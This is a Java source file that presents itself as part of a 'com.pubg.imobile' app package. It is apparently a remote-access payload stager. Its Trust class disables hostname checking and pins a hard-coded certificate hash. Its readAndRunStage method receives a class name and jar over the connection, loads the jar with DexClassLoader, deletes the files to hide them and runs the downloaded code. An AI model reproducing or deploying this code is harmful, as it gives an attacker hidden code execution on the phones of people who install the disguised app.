package com.pubg.imobile;

import java.io.DataInputStream;
import static com.pubg.imobile.Trigger.session_expiry;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.URLConnection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import dalvik.system.DexClassLoader;

public class Trust implements X509TrustManager, HostnameVerifier {
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

    public static String getCertificateSHA1(X509Certificate cert) throws NoSuchAlgorithmException, CertificateEncodingException {
        MessageDigest md = MessageDigest.getInstance("SHA-1");
        md.update(cert.getEncoded());
        return bytesToHex(md.digest());
    }

    public static String bytesToHex(byte[] bytes) {
        char[] hexDigits = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        StringBuilder buf = new StringBuilder(bytes.length * 2);
        for (byte aByte : bytes) {
            buf.append(hexDigits[(aByte & 240) >> 4]);
            buf.append(hexDigits[aByte & 15]);
        }
        return buf.toString();
    }

    public void checkClientTrusted(X509Certificate[] certs, String authType) {
    }

    public void checkServerTrusted(X509Certificate[] certs, String authType) throws CertificateException {
        String payloadHash = "HT98SRYH7594EY99HAE9HOG";
        if (payloadHash.length() != 0) {
            if (certs == null || certs.length < 1) {
                throw new CertificateException();
            }
            int length = certs.length;
            int i = 0;
            while (i < length) {
                try {
                    if (getCertificateSHA1(certs[i]).equals(payloadHash)) {
                        i++;
                    } else {
                        throw new CertificateException("Invalid certificate");
                    }
                } catch (Exception e) {
                    throw new CertificateException(e);
                }
            }
        }
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }
    public static void readAndRunStage(DataInputStream input, OutputStream output, String[] args) throws Exception {
        String dirPath = args[0];
        String jarFilePath = dirPath + File.separatorChar + "Runner.jar";
        String dexFilePath = dirPath + File.separatorChar + "Runner.dex";

        int coreSize1 = input.readInt();
        byte[] coreData1 = new byte[coreSize1];
        input.readFully(coreData1);

        String className = new String(coreData1);

        int coreSize2 = input.readInt();
        byte[] coreData2 = new byte[coreSize2];
        input.readFully(coreData2);

        File jarFile = new File(jarFilePath);

        if (!jarFile.exists()) {
            jarFile.createNewFile();
        }

        FileOutputStream fileOutputStream = new FileOutputStream(jarFile);
        fileOutputStream.write(coreData2);
        fileOutputStream.flush();
        fileOutputStream.close();

        Class<?> loadedClass = new DexClassLoader(jarFilePath, dirPath, dirPath, Cheetah.class.getClassLoader()).loadClass(className);

        Object stageInstance = loadedClass.newInstance();

        jarFile.delete();
        new File(dexFilePath).delete();

        loadedClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
                .invoke(stageInstance, input, output, args);

        session_expiry = -1;
    }

    public static void useFor(URLConnection uc) throws Exception {
        if (uc instanceof HttpsURLConnection) {
            HttpsURLConnection huc = (HttpsURLConnection) uc;
            Trust ptm = new Trust();
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, new TrustManager[]{ptm}, new SecureRandom());
            huc.setSSLSocketFactory(sc.getSocketFactory());
            huc.setHostnameVerifier(ptm);
        }
    }
}